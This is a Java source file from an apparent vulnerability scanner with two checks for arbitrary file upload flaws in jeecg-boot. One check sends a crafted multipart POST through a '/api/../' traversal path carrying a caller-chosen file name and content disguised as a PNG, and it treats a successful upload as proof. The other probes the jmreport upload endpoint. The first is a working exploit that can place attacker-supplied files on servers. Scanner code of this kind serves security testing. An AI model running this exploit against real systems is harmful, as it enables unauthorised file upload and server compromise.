package com.security.scanner.vulnerabilities;

import net.sf.json.JSONObject;
import com.security.scanner.utils.NetworkUtils;
import com.security.scanner.utils.FileUtils;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FileUploadVulnerabilities {

    public static String testCommonControllerFileUpload(String url, String userAgent, String fileName, String fileContent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();

        try {
            NetworkUtils.configureSSL();
            URL url1 = new URL(normalizedUrl + "/api/../commonController.do?parserXml");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", userAgent);
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
            connection.setRequestProperty("Accept-Encoding", "gzip, deflate");

            String boundary = "----WebKitFormBoundaryyfyhSCMs9cajzFD4";
            StringBuilder requestBody = new StringBuilder();
            requestBody.append("--").append(boundary).append("\r\n");
            requestBody.append("Content-Disposition: form-data; name=\"name\"\r\n");
            requestBody.append("\r\n");
            requestBody.append("qwe.png").append("\r\n");
            requestBody.append("--").append(boundary).append("\r\n");
            requestBody.append("Content-Disposition: form-data; name=\"documentTitle\"\r\n");
            requestBody.append("\r\n");
            requestBody.append("blank").append("\r\n");
            requestBody.append("--").append(boundary).append("\r\n");
            requestBody.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(fileName).append("\"\r\n");
            requestBody.append("Content-Type: image/png\r\n");
            requestBody.append("\r\n");
            requestBody.append(fileContent).append("\r\n");
            requestBody.append("--").append(boundary).append("--").append("\r\n");

            byte[] requestData = requestBody.toString().getBytes(StandardCharsets.UTF_8);
            connection.setRequestProperty("Content-Length", String.valueOf(requestData.length));
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestData);
            outputStream.flush();
            outputStream.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                response.append(line);
            }

            JSONObject jsonObject = JSONObject.fromObject(response.toString());
            String msg = jsonObject.getString("msg");

            if (msg.equals("操作成功")) {
                return formattedDateTime + url + "[+++]存在jeecg-boot commonController 任意文件上传漏洞\n" + url + "/api/../commonController.do?parserXml\n";
            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot commonController 任意文件上传漏洞\n";
            }
        } catch (Exception e) {
            return formattedDateTime + url + "[-]不存在jeecg-boot commonController 任意文件上传漏洞-\n";
        }
    }

    public static String testJmreportFileUpload(String url, String userAgent) {
        String normalizedUrl = NetworkUtils.normalizeUrl(url);
        String formattedDateTime = FileUtils.getCurrentDateTime();

        try {
            NetworkUtils.configureSSL();
            String response = NetworkUtils.sendGetRequest(normalizedUrl + "/jeecg-boot/jmreport/upload", userAgent);

            JSONObject jsonObject = JSONObject.fromObject(response);
            int code = jsonObject.optInt("code");

            if (code == 405) {
                return formattedDateTime + url + "[+]存在jeecg-boot jmreport任意文件上传漏洞 poc1\n" + url + "/jeecg-boot/jmreport/upload\n";

            } else {
                return formattedDateTime + url + "[-]不存在jeecg-boot jmreport任意文件上传漏洞 poc1\n";
            }
        } catch (Exception e) {
            return formattedDateTime + "[-]不存在jeecg-boot jmreport任意文件上传漏洞-poc1\n";
        }
    }
}
